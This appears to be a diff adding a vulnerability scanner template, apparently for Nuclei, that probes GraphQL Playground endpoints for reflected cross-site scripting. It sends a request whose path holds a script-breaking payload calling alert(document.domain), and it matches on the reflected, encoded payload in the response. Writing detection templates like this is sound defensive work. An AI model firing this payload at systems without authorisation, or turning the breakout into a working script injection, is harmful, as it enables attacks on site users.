@@ -1,0 +1,36 @@
+id: graphql-reflected-xss
+
+info:
+  name: graphql reflected xss
+  author: tess
+  severity: unknown
+  metadata:
+    verified: true
+  tags: xss,graphql,misconfig
+
+requests:
+  - raw:
+      - |+
+        GET /graphql/;</script><script>alert(document.domain)</script> HTTP/2
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
+        Accept-Encoding: gzip,deflate,br
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '/graphql/;%3C/script%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3E'
+          - 'GraphQLPlayground.init(root'
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+
+      - type: status
+        status:
+          - 200
